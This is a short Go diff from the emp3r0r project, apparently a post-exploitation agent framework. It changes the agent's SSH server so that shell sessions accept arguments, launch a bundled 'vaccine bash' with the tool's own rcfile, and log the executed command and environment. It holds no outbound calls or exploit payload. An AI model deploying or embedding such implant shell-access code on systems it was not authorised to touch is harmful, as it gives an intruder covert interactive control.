@@ -11,6 +11,8 @@ import (
 
 	"github.com/creack/pty"
 	"github.com/gliderlabs/ssh"
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 func setWinsize(f *os.File, w, h int) {
@@ -20,7 +22,7 @@ func setWinsize(f *os.File, w, h int) {
 
 // SSHD start a ssh server to provide shell access for clients
 // the server binds local interface only
-func SSHD(shell, port string) (err error) {
+func SSHD(shell, port string, args []string) (err error) {
 	exe, err := exec.LookPath(shell)
 	if err != nil {
 		res := fmt.Sprintf("%s not found (%v), aborting", shell, err)
@@ -28,9 +30,17 @@ func SSHD(shell, port string) (err error) {
 		return
 	}
 
+	// vaccine bash
+	v_bash := emp3r0r_data.UtilsPath + "/bash"
+
 	ssh.Handle(func(s ssh.Session) {
-		cmd := exec.Command(exe)
+		cmd := exec.Command(exe, args...)
+		if shell == "bash" && util.IsFileExist(v_bash) {
+			cmd = exec.Command(v_bash, "--rcfile", emp3r0r_data.UtilsPath+"/.bashrc")
+		}
 		cmd.Env = append(cmd.Env, os.Environ()...)
+		log.Printf("sshd execute: %s %v, env=%s", exe, args, cmd.Env)
+
 		ptyReq, winCh, isPTY := s.Pty()
 		if isPTY {
 			log.Printf("Got an SSH PTY request: %s", ptyReq.Term)
